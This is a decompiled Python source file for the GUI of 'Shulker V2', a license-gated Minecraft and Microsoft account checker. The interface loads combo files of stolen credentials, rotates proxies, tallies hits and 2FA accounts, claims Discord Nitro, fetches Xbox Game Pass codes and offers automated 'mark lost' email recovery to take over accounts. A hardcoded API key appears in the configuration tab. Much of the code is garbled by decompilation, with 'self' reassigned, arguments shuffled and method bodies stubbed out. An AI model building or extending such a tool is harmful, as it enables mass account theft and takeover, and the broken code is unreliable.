            header_frame = ctk.CTkFrame(self, fg_color=DARK_THEME['surface'], corner_radius=5, border_width=1, border_color=DARK_THEME['border'])
            header_frame.grid(row=current_row, column=0, columnspan=2, padx=5, pady=(15, 5), sticky='ew')
            header = ctk.CTkLabel(header_frame, text=category, font=('Segoe UI', 14, 'bold'), text_color=DARK_THEME['text_primary'])
            header.pack(padx=10, pady=5)
            current_row += 1
            for stat_key, stat_name in stats:
                name_label = ctk.CTkLabel(self, text=f'  {stat_name}:', font=('Segoe UI', 12), anchor='w', text_color=DARK_THEME['text_secondary'])
                name_label.grid(row=current_row, column=0, padx=10, pady=2, sticky='w')
                value_label = ctk.CTkLabel(self, text='0', font=('Segoe UI', 12, 'bold'), anchor='e', text_color=DARK_THEME['text_primary'])
                value_label.grid(row=current_row, column=1, padx=10, pady=2, sticky='e')
                self.stat_labels[stat_key] = value_label
                current_row += 1

    def update_stats(self, stats: Dict):
        """\nUpdate all stats\n\nArgs:\n    stats: Stats dictionary from checker engine\n"""  # inserted
        try:
            if not stats:
                pass  # postinserted
            return None
        except Exception as e:
            return None

class CompactStatsDisplay(ctk.CTkFrame):
    """Compact stats display for main GUI window"""

    def __init__(self, parent, **kwargs):
        super().__init__(parent, **kwargs)
        self.grid_columnconfigure(0, weight=1)
        self.grid_columnconfigure(1, weight=1)
        self.grid_columnconfigure(2, weight=1)
        self.stat_frames = {}
        self._create_stat_displays()

    def _create_stat_displays(self):
        """Create compact stat display boxes"""  # inserted
        stats_config = [[('valid', '✅ Valid', 'green'), ('invalid', '❌ Invalid', 'red'), ('checked', '📊 Checked', 'blue')], [('minecraft_java_owned', '🎮 Java Owned', 'green'), ('minecraft_both_owned', '🎮 Both Owned', 'orange'), ('gamepass_only', '🎮 Game Pass', 'yellow')], [('mark_lost_success', '✅ Mark Lost', 'green'), ('nitro_claimed', '🎁 Nitro Claimed', 'purple'), ('clean_accounts', '🔓 Clean', 'cyan')]]
        for row_idx, row_stats in enumerate(stats_config):
            for col_idx, (stat_key, stat_label, color) in enumerate(row_stats):
                frame = self._create_stat_box(stat_label, color)
                frame.grid(row=row_idx, column=col_idx, padx=5, pady=5, sticky='ew')
                self.stat_frames[stat_key] = frame

    def _create_stat_box(self, label: str, color: str):
        """Create a single stat box"""  # inserted
        frame = ctk.CTkFrame(self, fg_color=DARK_THEME['surface'], corner_radius=8, border_width=1, border_color=DARK_THEME['border'])
        frame.grid_columnconfigure(0, weight=1)
        label_widget = ctk.CTkLabel(frame, text=label, font=('Segoe UI', 11), text_color=DARK_THEME['text_primary'])
        label_widget.grid(row=0, column=0, padx=10, pady=(8, 2))
        value_widget = ctk.CTkLabel(frame, text='0', font=('Segoe UI', 20, 'bold'), text_color=DARK_THEME['text_primary'])
        value_widget.grid(row=1, column=0, padx=10, pady=(2, 8))
        frame.value_label = value_widget
        return frame

    def update_stats(self, stats: Dict):
        """Update stats display"""  # inserted
        for stat_key, frame in self.stat_frames.items():
            value = stats.get(stat_key, 0)
            frame.value_label.configure(text=str(value))

class LoadingScreen:
    """Modern animated loading screen"""

    def __init__(self, parent):
        self.parent = parent
        self.frame = None
        self.is_visible = False

    def show(self, message='Loading...'):
        """Show loading screen with animation"""  # inserted
        if self.is_visible:
            pass  # postinserted
        return None

    def _animate_progress(self):
        """Animate progress bar - optimized"""  # inserted
        if not self.is_visible:
            pass  # postinserted
        return None

    def _animate_logo(self):
        """Animate logo pulsing effect - optimized"""  # inserted
        if not self.is_visible:
            pass  # postinserted
        return None

    def update_message(self, message):
        """Update loading message"""  # inserted
        if self.message_label:
            self.message_label.configure(text=message)
        return None

    def hide(self):
        """Hide loading screen with fade"""  # inserted
        if not self.is_visible:
            pass  # postinserted
        return None

    def _fade_out(self, alpha=1.0):
        """Fade out animation"""  # inserted
        if alpha <= 0 and self.frame:
            self.frame.destroy()
            self.frame = None
        return None

class AnimationHelper:
    """Helper class for smooth animations"""

    @staticmethod
    def fade_in(widget, duration=300, steps=10):
        """Fade in widget (simulated with color transition)"""  # inserted
        widget.update()

    @staticmethod
    def slide_in(widget, direction='left', duration=300):
        """Slide in animation (simulated)"""  # inserted
        widget.update()

    @staticmethod
    def pulse(widget, color1, color2, interval=1000):
        """Pulse animation between two colors"""  # inserted

        def toggle():
            current = widget.cget('fg_color')
            new_color = color2 if current == color1 else color1
            widget.configure(fg_color=new_color)
            widget.after(interval, toggle)
        widget()

class LogHandler:
    """Custom log handler to stream formatted logs to GUI"""

    def __init__(self, text_widget, app_instance):
        self.text_widget = text_widget
        self.queue = Queue()
        self.app = app_instance

    def add_log(self, log_entry, color_tag):
        """Add formatted log entry to queue"""  # inserted
        self.queue.put((log_entry, color_tag))

    def process_queue(self):
        """Process queued log entries (called from main thread)"""  # inserted
        try:
                pass
                log_entry, color_tag = self.queue.get_nowait()
                self.text_widget.insert('end', log_entry + '\n', color_tag)
                self.text_widget.see('end')
                line_count = int(self.text_widget.index('end-1c').split('.')[0])
                if line_count > 10000:
                    self.text_widget.delete('1.0', '1001.0')
                continue
        except:
            pass  # postinserted
        return None

class ShulkerApp(ctk.CTk):
    """Complete Shulker V2 Application with Tabs"""

    def __init__(self):
        super(saved_license, self).__init__()
        self.config = ConfigLoader()
        self.title(f"{self.config.get('general.app_name')} v{self.config.get('general.version')} - Complete")
        self.configure(fg_color=MODERN_COLORS['background'])
        self.minsize(1200, 800)
        self._setup_performance_optimizations()
        self.after(100, self._set_maximized)
        self.license_key_var = ctk.StringVar()
        self.license_valid = False
        self.license_info = None
        self.combo_file = None
        self.checking = False
        self.paused = False
        self.checker_engine = None
        self.worker_threads = []
        self.account_queue = None
        self.results_lock = threading.Lock()
        self.pause_event = threading.Event()
        self.pause_event.set()
        self.total_accounts = 0
        self.stats = {'checked': 0, 'hits': 0, 'bad': 0, 'errors': 0, 'cpm': 0, 'progress': 0, 'total': 0, 'gamepass_pc': 0, 'gamepass_ultimate': 0, 'mark_lost_success': 0, 'nitro_claimed': 0, 'nitro_unclaimed': 0, 'xbox_codes': 0, 'normal_minecraft': 0, '2fa': 0, 'valid_mails': 0, 'retries': 0}
        self.start_time = 0
        self.settings = {'thread_count': self.config.get('threading.max_threads', 5), 'proxy_enabled': self.config.get('proxies.enabled', False), 'discord_enabled': self.config.get('discord.enabled', False), 'auto_mark_lost': self.config.get('automation.auto_mark_lost', True), 'hypixel_enabled': self.config.get('checkers.hypixel_enabled', True), 'donut_enabled': self.config.get('checkers.donut_enabled', True), 'ms_rewards_enabled': self.config.get('checkers.ms_rewards_enabled', False)}
        self.loading_screen = LoadingScreen(self)
        self = self.config.get('license.key')
        if self:
            self.loading_screen.show('Checking license...')
            self.after(100, lambda: self.check_saved_license(saved_license))
        return None

    def _setup_performance_optimizations(self):
        """Setup performance optimizations for smooth UI"""  # inserted
        self._resize_in_progress = False
        self._last_resize_time = 0
        self.bind('<Configure>', self._on_window_configure)
        self.bind('<Map>', self._on_window_map)
        self._update_queue = []
        self._update_pending = False

    def _set_maximized(self):
        """Set window to maximized state after initialization"""  # inserted
        try:
            self.state('zoomed')
        except:
            try:
                self.attributes('-zoomed', True)
            except:
                self.geometry(f'{self.winfo_screenwidth()}x{self.winfo_screenheight()}')

    def _on_window_configure(self, event):
        """Optimized window resize handler"""  # inserted
        if event.widget!= self:
            pass  # postinserted
        return None

    def _on_window_map(self, event):
        """Window map event - optimize initial render"""  # inserted
        if event.widget == self:
            self.update_idletasks()
        return None

    def _finalize_resize(self):
        """Finalize resize operations"""  # inserted
        self._resize_in_progress = False
        self.update_idletasks()

    def check_saved_license(self, license_key: str):
        """Check if saved license is valid"""  # inserted
        logger.info('Checking saved license...')
        self.loading_screen.update_message('Validating license...')
        server_url = self.config.get('license.server_url')
        validator = LicenseValidator(server_url)
        is_valid, license_info = validator.validate(license_key)
        if is_valid:
            self.license_valid = True
            self.license_info = license_info
            logger.info('✅ Saved license is valid')
            self.loading_screen.update_message('Loading interface...')
            self.after(300, lambda: [self.loading_screen.hide(), self.show_main_interface()])
        return None

    def show_license_activation(self):
        """Show license activation screen with modern design"""  # inserted
        logger.info('Showing license activation screen')
        for widget in self.winfo_children():
            if hasattr(self, 'loading_screen') and self.loading_screen.frame and (widget!= self.loading_screen.frame):
                widget.destroy()
            else:  # inserted
                if not hasattr(self, 'loading_screen'):
                    pass  # postinserted
                else:  # inserted
                    widget.destroy()
        main_frame = ctk.CTkFrame(self, corner_radius=0, fg_color=MODERN_COLORS['background'])
        main_frame.pack(fill='both', expand=True)
        center_container = ctk.CTkFrame(main_frame, fg_color='transparent')
        center_container.place(relx=0.5, rely=0.5, anchor='center')
        title_label = ctk.CTkLabel(center_container, text='🎮 SHULKER V2', font=ctk.CTkFont(size=52, weight='bold'), text_color=MODERN_COLORS['primary'])
        title_label.pack(pady=(0, 10))
        subtitle_label = ctk.CTkLabel(center_container, text='The Ultimate Minecraft Account Checker', font=ctk.CTkFont(size=18), text_color=MODERN_COLORS['text_secondary'])
        subtitle_label.pack(pady=(0, 40))
        license_card = ctk.CTkFrame(center_container, corner_radius=20, fg_color=MODERN_COLORS['surface'], border_width=2, border_color=MODERN_COLORS['border_accent'])
        license_card.pack(pady=20, padx=40, fill='x')
        license_label = ctk.CTkLabel(license_card, text='Enter License Key', font=ctk.CTkFont(size=20, weight='bold'), text_color=MODERN_COLORS['text_primary'])
        license_label.pack(pady=(30, 15))
        license_entry = ctk.CTkEntry(license_card, self.license_key_var, textvariable=450, width=50, height=ctk.CTkFont(size=16), font=10, corner_radius=2, border_width=MODERN_COLORS['border_accent'], border_color=MODERN_COLORS['background'], fg_color=MODERN_COLORS['text_primary'], text_color=MODERN_COLORS['text_primary'], placeholder_text='Enter your license key here...')
        license_entry.pack(pady=15, padx=30)
        activate_btn = ctk.CTkButton(license_card, text='Activate License', command=self.activate_license, width=300, height=50, font=ctk.CTkFont(size=16, weight='bold'), fg_color=MODERN_COLORS['primary'], hover_color=MODERN_COLORS['primary_hover'], corner_radius=10)
        activate_btn.pack(pady=(10, 30))

    def activate_license(self):
        """Activate license with loading animation"""  # inserted
        self = self.license_key_var.get().strip()
        if not self:
            messagebox.showerror('Error', 'Please enter a license key')
        return None

    def show_main_interface(self):
        """Show main tabbed interface"""  # inserted
        logger.info('Loading main interface...')
        for widget in self.winfo_children():
            widget.destroy()
        self.grid_rowconfigure(0, weight=0)
        self.grid_rowconfigure(1, weight=1)
        self.grid_rowconfigure(2, weight=0)
        self.grid_columnconfigure(0, weight=1)
        self.create_header()
        self.create_tabs()
        self.create_status_bar()
        self.update_stats_loop()

    def create_header(self):
        """Create modern header with logo and license info"""  # inserted
        header_frame = ctk.CTkFrame(self, height=70, corner_radius=0, fg_color=MODERN_COLORS['surface'], border_width=0, border_color=MODERN_COLORS['border'])
        header_frame.grid(row=0, column=0, sticky='ew', padx=0, pady=0)
        header_frame.grid_propagate(False)
        logo_label = ctk.CTkLabel(header_frame, text='🎮 SHULKER V2', font=ctk.CTkFont(size=26, weight='bold'), text_color=MODERN_COLORS['primary'])
        logo_label.pack(side='left', padx=25, pady=20)
        if self.license_info:
            validator = LicenseValidator(self.config.get('license.server_url'))
            expiry_info = validator.get_expiry_info(self.license_info['expires'])
            license_badge = ctk.CTkFrame(header_frame, corner_radius=15, fg_color=MODERN_COLORS['primary'], height=35)
            license_badge.pack(side='right', padx=20, pady=17)
            license_label = ctk.CTkLabel(license_badge, text=f"✅ Licensed | {expiry_info['days_left']} days left", font=ctk.CTkFont(size=12, weight='bold'), text_color='white')
            license_label.pack(padx=15, pady=8)
        return None

    def create_tabs(self):
        """Create tabbed interface with dark theme"""  # inserted
        self.tab_view = ctk.CTkTabview(self, fg_color=MODERN_COLORS['background'], segmented_button_fg_color=MODERN_COLORS['surface'], segmented_button_selected_color=MODERN_COLORS['primary'], segmented_button_selected_hover_color=MODERN_COLORS['primary_hover'], segmented_button_unselected_color=MODERN_COLORS['surface'], segmented_button_unselected_hover_color=MODERN_COLORS['surface_hover'])
        self.tab_view.grid(row=1, column=0, sticky='nsew', padx=20, pady=20)
        self.tab_checker = self.tab_view.add('🎮 Checker')
        self.tab_config = self.tab_view.add('⚙️ Configuration')
        self.tab_logs = self.tab_view.add('📋 Live Logs')
        self.tab_stats = self.tab_view.add('📊 Statistics')
        self.tab_results = self.tab_view.add('📁 Results')
        self.tab_checker.configure(fg_color=MODERN_COLORS['background'])
        self.tab_config.configure(fg_color=MODERN_COLORS['background'])
        self.tab_logs.configure(fg_color=MODERN_COLORS['background'])
        self.tab_stats.configure(fg_color=MODERN_COLORS['background'])
        self.tab_results.configure(fg_color=MODERN_COLORS['background'])
        self.create_checker_tab()
        self.create_config_tab()
        self.create_logs_tab()
        self.create_stats_tab()
        self.create_results_tab()

    def create_checker_tab(self):
        """Create checker tab (main interface)"""  # inserted
        self.tab_checker.grid_columnconfigure(0, weight=2)
        self.tab_checker.grid_columnconfigure(1, weight=1)
        self.tab_checker.grid_rowconfigure(0, weight=1)
        left_frame = ctk.CTkScrollableFrame(self.tab_checker, fg_color=MODERN_COLORS['background'], corner_radius=0)
        left_frame.grid(row=0, column=0, sticky='nsew', padx=(0, 10))
        title_label = ctk.CTkLabel(left_frame, text='CHECKER CONTROLS', font=ctk.CTkFont(size=20, weight='bold'))
        title_label.pack(pady=(20, 10))
        file_card = ctk.CTkFrame(left_frame, corner_radius=15, fg_color=MODERN_COLORS['surface'], border_width=1, border_color=MODERN_COLORS['border'])
        file_card.pack(pady=15, padx=20, fill='x')
        file_header = ctk.CTkLabel(file_card, text='📁 Combo File', font=ctk.CTkFont(size=14, weight='bold'), text_color=MODERN_COLORS['text_primary'])
        file_header.pack(pady=(15, 5), padx=15, anchor='w')
        file_content = ctk.CTkFrame(file_card, fg_color='transparent')
        file_content.pack(pady=(5, 15), padx=15, fill='x')
        self.combo_file_label = ctk.CTkLabel(file_content, text='No file selected', font=ctk.CTkFont(size=12), text_color=MODERN_COLORS['text_secondary'], anchor='w')
        self.combo_file_label.pack(side='left', padx=(0, 10), fill='x', expand=True)
        browse_btn = ctk.CTkButton(file_content, text='Browse', command=self.browse_combo_file, width=100, height=35, font=ctk.CTkFont(size=12, weight='bold'), fg_color=MODERN_COLORS['primary'], hover_color=MODERN_COLORS['primary_hover'], corner_radius=8)
        browse_btn.pack(side='right')
        thread_card = ctk.CTkFrame(left_frame, corner_radius=15, fg_color=MODERN_COLORS['surface'], border_width=1, border_color=MODERN_COLORS['border'])
        thread_card.pack(pady=15, padx=20, fill='x')
        thread_header = ctk.CTkLabel(thread_card, text='🧵 Thread Count', font=ctk.CTkFont(size=14, weight='bold'), text_color=MODERN_COLORS['text_primary'])
        thread_header.pack(pady=(15, 5), padx=15, anchor='w')
        self.thread_label = ctk.CTkLabel(thread_card, text=f"{self.settings['thread_count']} threads", font=ctk.CTkFont(size=18, weight='bold'), text_color=MODERN_COLORS['primary'])
        self.thread_label.pack(pady=5)
        self.thread_slider = ctk.CTkSlider(thread_card, from_=1, to=20, number_of_steps=19, command=self.update_thread_count, progress_color=MODERN_COLORS['primary'], button_color=MODERN_COLORS['primary'], button_hover_color=MODERN_COLORS['primary_hover'])
        self.thread_slider.set(self.settings['thread_count'])
        self.thread_slider.pack(pady=(10, 15), padx=20, fill='x')
        toggles_card = ctk.CTkFrame(left_frame, corner_radius=15, fg_color=MODERN_COLORS['surface'], border_width=1, border_color=MODERN_COLORS['border'])
        toggles_card.pack(pady=15, padx=20, fill='x')
        ctk.CTkLabel(toggles_card, text='⚡ Quick Settings', font=ctk.CTkFont(size=14, weight='bold'), text_color=MODERN_COLORS['text_primary']).pack(pady=(15, 10), padx=15, anchor='w')
        toggle_container = ctk.CTkFrame(toggles_card, fg_color='transparent')
        toggle_container.pack(pady=(5, 15), padx=15, fill='x')
        self.proxy_check = ctk.CTkCheckBox(toggle_container, text='Enable Proxies', command=self.toggle_proxies, font=ctk.CTkFont(size=13), checkbox_width=20, checkbox_height=20, border_width=2)
        self.proxy_check.pack(pady=8, anchor='w')
        if self.settings['proxy_enabled']:
            self.proxy_check.select()
        self.discord_check = ctk.CTkCheckBox(toggle_container, text='Enable Discord Webhook', command=self.toggle_discord, font=ctk.CTkFont(size=13), checkbox_width=20, checkbox_height=20, border_width=2)
        self.discord_check.pack(pady=8, anchor='w')
        if self.settings['discord_enabled']:
            self.discord_check.select()
        button_card = ctk.CTkFrame(left_frame, corner_radius=15, fg_color=MODERN_COLORS['surface'], border_width=1, border_color=MODERN_COLORS['border'])
        button_card.pack(pady=15, padx=20, fill='x')
        button_container = ctk.CTkFrame(button_card, fg_color='transparent')
        button_container.pack(pady=15, padx=15, fill='x')
        self.start_btn = ctk.CTkButton(button_container, text='▶ START CHECKING', command=self.start_checking, width=220, height=55, font=ctk.CTkFont(size=17, weight='bold'), fg_color=MODERN_COLORS['primary'], hover_color=MODERN_COLORS['primary_hover'], corner_radius=12, state='disabled')
        self.start_btn.pack(pady=8)
        self.pause_btn = ctk.CTkButton(button_container, text='⏸ PAUSE', command=self.pause_checking, width=220, height=45, font=ctk.CTkFont(size=15, weight='bold'), fg_color=MODERN_COLORS['warning'], hover_color=MODERN_COLORS['surface_hover'], corner_radius=12, state='disabled')
        self.pause_btn.pack(pady=5)
        self.stop_btn = ctk.CTkButton(button_container, text='⏹ STOP', command=self.stop_checking, width=220, height=45, font=ctk.CTkFont(size=15, weight='bold'), fg_color=MODERN_COLORS['danger'], hover_color=MODERN_COLORS['surface_hover'], corner_radius=12, state='disabled')
        self.stop_btn.pack(pady=5)
        progress_card = ctk.CTkFrame(left_frame, corner_radius=15, fg_color=MODERN_COLORS['surface'], border_width=1, border_color=MODERN_COLORS['border'])
        progress_card.pack(pady=15, padx=20, fill='x')
        ctk.CTkLabel(progress_card, text='📊 Progress', font=ctk.CTkFont(size=14, weight='bold'), text_color=MODERN_COLORS['text_primary']).pack(pady=(15, 10), padx=15, anchor='w')
        self.progress_bar = ctk.CTkProgressBar(progress_card, width=280, height=22, progress_color=MODERN_COLORS['primary'], fg_color=MODERN_COLORS['background'], corner_radius=11)
        self.progress_bar.pack(pady=10, padx=15)
        self.progress_bar.set(0)
        self.progress_label = ctk.CTkLabel(progress_card, text='0 / 0 (0%)', font=ctk.CTkFont(size=13, weight='bold'), text_color=MODERN_COLORS['text_secondary'])
        self.progress_label.pack(pady=(0, 15))
        stats_card = ctk.CTkFrame(left_frame, corner_radius=15, fg_color=MODERN_COLORS['surface'], border_width=1, border_color=MODERN_COLORS['border'])
        stats_card.pack(pady=15, padx=20, fill='both', expand=True)
        stats_title = ctk.CTkLabel(stats_card, text='📊 STATISTICS', font=ctk.CTkFont(size=18, weight='bold'), text_color=MODERN_COLORS['text_primary'])
        stats_title.pack(pady=(20, 15))
        stats_scroll = ctk.CTkScrollableFrame(stats_card, fg_color='transparent')
        stats_scroll.pack(fill='both', expand=True, padx=15, pady=(0, 15))
        stats_config = [('Bad:', 'bad_label', '❌'), ('Hits:', 'hits_label', '✅'), ('Xbox Game Pass:', 'gamepass_pc_label', '🎮'), ('Xbox Game Pass Ultimate:', 'gamepass_ultimate_label', '🎮'), ('Auto Mark Lost:', 'mark_lost_label', '🔄'), ('Xbox Nitro (Claimed):', 'nitro_claimed_label', '💜'), ('Xbox Nitro (Unclaimed):', 'nitro_unclaimed_label', '💜'), ('Xbox Redeem Codes:', 'xbox_codes_label', '🎁'), ('Normal (Minecraft Only):', 'normal_label', '🎮'), ('2FA:', '2fa_label', '🔒'), ('Valid Mails:', 'valid_mails_label', '📧'), ('Retries:', 'retries_label', '🔄'), ('Errors:', 'errors_label', '⚠️')]
        self.stats_labels = {}
        for label_text, key, icon in stats_config:
            stat_row = ctk.CTkFrame(stats_scroll, fg_color='transparent', corner_radius=8)
            stat_row.pack(fill='x', pady=4, padx=5)
            label = ctk.CTkLabel(stat_row, text=f'{icon} {label_text}', font=ctk.CTkFont(size=13), anchor='w', text_color=MODERN_COLORS['text_secondary'], width=200)
            label.pack(side='left', padx=(8, 10))
            value_label = ctk.CTkLabel(stat_row, text='0', font=ctk.CTkFont(size=14, weight='bold'), anchor='e', text_color=MODERN_COLORS['primary'])
            value_label.pack(side='right', padx=8)
            self.stats_labels[key] = value_label
        right_card = ctk.CTkFrame(self.tab_checker, corner_radius=15, fg_color=MODERN_COLORS['surface'], border_width=1, border_color=MODERN_COLORS['border'])
        right_card.grid(row=0, column=1, sticky='nsew', padx=(10, 0))
        ctk.CTkLabel(right_card, text='📊 DETAILED STATS', font=ctk.CTkFont(size=18, weight='bold'), text_color=MODERN_COLORS['text_primary']).pack(pady=(20, 10))
        self.mini_stats_text = ctk.CTkTextbox(right_card, font=ctk.CTkFont(size=11, family='Consolas'), height=500, corner_radius=10, fg_color=MODERN_COLORS['background'], text_color=MODERN_COLORS['text_primary'], border_width=1, border_color=MODERN_COLORS['border'])
        self.mini_stats_text.pack(fill='both', expand=True, padx=15, pady=(0, 15))

    def create_config_tab(self):
        """Create comprehensive configuration tab"""  # inserted
        scroll_frame = ctk.CTkScrollableFrame(self.tab_config, fg_color=MODERN_COLORS['background'], corner_radius=0)
        scroll_frame.pack(fill='both', expand=True, padx=20, pady=20)
        ctk.CTkLabel(scroll_frame, text='⚙️ COMPLETE CONFIGURATION', font=ctk.CTkFont(size=24, weight='bold')).pack(pady=20)
        proxy_frame = ctk.CTkFrame(scroll_frame, fg_color=MODERN_COLORS['surface'], corner_radius=15, border_width=1, border_color=MODERN_COLORS['border'])
        proxy_frame.pack(fill='x', pady=10, padx=20)
        ctk.CTkLabel(proxy_frame, text='🌐 Proxy Settings', font=ctk.CTkFont(size=18, weight='bold')).pack(pady=10, anchor='w', padx=10)
        self.proxy_enabled_var = ctk.BooleanVar(value=self.config.get('proxies.enabled', False))
        ctk.CTkCheckBox(proxy_frame, text='Enable Proxies', variable=self.proxy_enabled_var).pack(anchor='w', padx=20, pady=5)
        proxy_file_frame = ctk.CTkFrame(proxy_frame, fg_color='transparent')
        proxy_file_frame.pack(fill='x', pady=5, padx=10)
        ctk.CTkLabel(proxy_file_frame, text='Proxy File:', width=150, anchor='w', text_color=MODERN_COLORS['text_primary']).pack(side='left', padx=5)
        self.proxy_file_entry = ctk.CTkEntry(proxy_file_frame, width=300, fg_color=MODERN_COLORS['background'], text_color=MODERN_COLORS['text_primary'], border_color=MODERN_COLORS['border'])
        self.proxy_file_entry.pack(side='left', padx=5, fill='x', expand=True)
        self.proxy_file_entry.insert(0, self.config.get('proxies.file', 'proxies.txt'))
        proxy_type_frame = ctk.CTkFrame(proxy_frame, fg_color='transparent')
        proxy_type_frame.pack(fill='x', pady=5, padx=10)
        ctk.CTkLabel(proxy_type_frame, text='Proxy Type:', width=150, anchor='w', text_color=MODERN_COLORS['text_primary']).pack(side='left', padx=5)
        self.proxy_type_var = ctk.StringVar(value=self.config.get('proxies.type', 'http'))
        proxy_type_menu = ctk.CTkOptionMenu(proxy_type_frame, values=['http', 'socks4', 'socks5'], variable=self.proxy_type_var, width=150, fg_color=MODERN_COLORS['surface'], button_color=MODERN_COLORS['primary'], button_hover_color=MODERN_COLORS['primary_hover'])
        proxy_type_menu.pack(side='left', padx=5)
        proxy_rotation_frame = ctk.CTkFrame(proxy_frame, fg_color='transparent')
        proxy_rotation_frame.pack(fill='x', pady=5, padx=10)
        ctk.CTkLabel(proxy_rotation_frame, text='Rotation Mode:', width=150, anchor='w', text_color=MODERN_COLORS['text_primary']).pack(side='left', padx=5)
        self.proxy_rotation_var = ctk.StringVar(value=self.config.get('proxies.rotation_mode', 'round_robin'))
        rotation_menu = ctk.CTkOptionMenu(proxy_rotation_frame, values=['round_robin', 'random', 'sticky'], variable=self.proxy_rotation_var, width=150, fg_color=MODERN_COLORS['surface'], button_color=MODERN_COLORS['primary'], button_hover_color=MODERN_COLORS['primary_hover'])
        rotation_menu.pack(side='left', padx=5)
        threading_frame = ctk.CTkFrame(scroll_frame, fg_color=MODERN_COLORS['surface'], corner_radius=15, border_width=1, border_color=MODERN_COLORS['border'])
        threading_frame.pack(fill='x', pady=10, padx=20)
        ctk.CTkLabel(threading_frame, text='⚡ Threading Settings', font=ctk.CTkFont(size=18, weight='bold')).pack(pady=10, anchor='w', padx=10)
        max_threads_frame = ctk.CTkFrame(threading_frame, fg_color='transparent')
        max_threads_frame.pack(fill='x', pady=5, padx=10)
        ctk.CTkLabel(max_threads_frame, text='Max Threads (1-20):', width=200, anchor='w').pack(side='left', padx=5)
        self.max_threads_var = ctk.IntVar(value=self.config.get('threading.max_threads', 5))
        max_threads_slider = ctk.CTkSlider(max_threads_frame, from_=1, to=20, variable=self.max_threads_var, width=200)
        max_threads_slider.pack(side='left', padx=5)
        self.max_threads_label = ctk.CTkLabel(max_threads_frame, text=str(self.max_threads_var.get()))
        self.max_threads_label.pack(side='left', padx=5)
        max_threads_slider.configure(command=lambda v: self.max_threads_label.configure(text=str(int(v))))
        timeout_frame = ctk.CTkFrame(threading_frame, fg_color='transparent')
        timeout_frame.pack(fill='x', pady=5, padx=10)
        ctk.CTkLabel(timeout_frame, text='Timeout per Account (seconds):', width=200, anchor='w').pack(side='left', padx=5)
        self.timeout_var = ctk.IntVar(value=self.config.get('threading.timeout_per_account', 120))
        timeout_entry = ctk.CTkEntry(timeout_frame, width=100, textvariable=self.timeout_var)
        timeout_entry.pack(side='left', padx=5)
        checkers_frame = ctk.CTkFrame(scroll_frame, fg_color=MODERN_COLORS['surface'], corner_radius=15, border_width=1, border_color=MODERN_COLORS['border'])
        checkers_frame.pack(fill='x', pady=10, padx=20)
        ctk.CTkLabel(checkers_frame, text='🔍 Checker Settings', font=ctk.CTkFont(size=18, weight='bold')).pack(pady=10, anchor='w', padx=10)
        self.security_var = ctk.BooleanVar(value=self.config.get('checkers.security_enabled', True))
        ctk.CTkCheckBox(checkers_frame, text='Security Check (2FA Detection)', variable=self.security_var).pack(anchor='w', padx=20, pady=2)
        self.minecraft_var = ctk.BooleanVar(value=self.config.get('checkers.minecraft_enabled', True))
        ctk.CTkCheckBox(checkers_frame, text='Minecraft Ownership', variable=self.minecraft_var).pack(anchor='w', padx=20, pady=2)
        self.xbox_var = ctk.BooleanVar(value=self.config.get('checkers.xbox_enabled', True))
        ctk.CTkCheckBox(checkers_frame, text='Xbox Profile & Gamertag', variable=self.xbox_var).pack(anchor='w', padx=20, pady=2)
        self.nitro_var = ctk.BooleanVar(value=self.config.get('checkers.nitro_enabled', True))
        ctk.CTkCheckBox(checkers_frame, text='Discord Nitro', variable=self.nitro_var).pack(anchor='w', padx=20, pady=2)
        self.xbox_codes_var = ctk.BooleanVar(value=self.config.get('checkers.fetch_xbox_codes', True))
        ctk.CTkCheckBox(checkers_frame, text='Fetch Xbox Game Pass Codes', variable=self.xbox_codes_var).pack(anchor='w', padx=20, pady=2)
        self.hypixel_var = ctk.BooleanVar(value=self.config.get('checkers.hypixel_enabled', True))
        ctk.CTkCheckBox(checkers_frame, text='Hypixel Stats', variable=self.hypixel_var).pack(anchor='w', padx=20, pady=2)
        self.donut_var = ctk.BooleanVar(value=self.config.get('checkers.donut_enabled', True))
        ctk.CTkCheckBox(checkers_frame, text='Donut SMP Stats', variable=self.donut_var).pack(anchor='w', padx=20, pady=2)
        self.rewards_var = ctk.BooleanVar(value=self.config.get('checkers.ms_rewards_enabled', False))
        rewards_checkbox = ctk.CTkCheckBox(checkers_frame, text='MS Rewards Balance (Beta feature)', variable=self.rewards_var, command=self._on_rewards_checkbox_change)
        rewards_checkbox.pack(anchor='w', padx=20, pady=2)
        mark_lost_section = ctk.CTkFrame(checkers_frame, fg_color='transparent')
        mark_lost_section.pack(fill='x', padx=20, pady=5)
        mark_lost_header = ctk.CTkFrame(mark_lost_section, fg_color='transparent')
        mark_lost_header.pack(fill='x', pady=2)
        self.mark_lost_var = ctk.BooleanVar(value=self.config.get('automation.auto_mark_lost', False))
        mark_lost_checkbox = ctk.CTkCheckBox(mark_lost_header, text='Auto Mark Lost (Email Recovery)', variable=self.mark_lost_var, command=self._on_mark_lost_checkbox_change)
        mark_lost_checkbox.pack(side='left', anchor='w')
        refresh_btn = ctk.CTkButton(mark_lost_header, text='🔄 Refresh', width=100, height=28, command=self._refresh_email_count)
        refresh_btn.pack(side='left', padx=(10, 0))
        self.mark_lost_email_count_label = ctk.CTkLabel(mark_lost_header, text='', font=ctk.CTkFont(size=10), text_color='#888888', anchor='w')
        self.mark_lost_email_count_label.pack(side='left', padx=(10, 0))
        self.mark_lost_requirements_satisfied = False
        self.mark_lost_info_label = ctk.CTkLabel(mark_lost_section, text='', font=ctk.CTkFont(size=10), text_color='#ffaa00', anchor='w', justify='left', wraplength=600)
        self.mark_lost_info_label.pack(anchor='w', padx=(25, 0), pady=(5, 0))
        self.mark_lost_api_frame = ctk.CTkFrame(mark_lost_section, fg_color='transparent')
        self.mark_lost_api_frame.pack(fill='x', padx=(25, 0), pady=(5, 0))
        ctk.CTkLabel(self.mark_lost_api_frame, text='NotLetters API Key:', width=150, anchor='w').pack(side='left', padx=5)
        self.notletters_api_key_entry = ctk.CTkEntry(self.mark_lost_api_frame, width=400, placeholder_text='Leave empty if buying from Discord seller, or enter your API key if buying from website', show='*')
        self.notletters_api_key_entry.pack(side='left', padx=5, fill='x', expand=True)
        saved_key = self.config.get('automation.notletters_api_key', '')
        default_key = 'vFgjakA5QMdsSKruKwbeaaiHR5cS5KIQ'
        if saved_key and saved_key!= default_key:
            self.notletters_api_key_entry.insert(0, saved_key)

        def toggle_api_key_visibility():
            current_show = self.notletters_api_key_entry.cget('show')
            self.notletters_api_key_entry.configure(show='' if current_show == '*' else '*')
            toggle_btn.configure(text='👁️' if current_show == '*' else '🙈')
        self = ctk.CTkButton(self.mark_lost_api_frame, text='👁️', width=40, height=28, command=toggle_api_key_visibility)
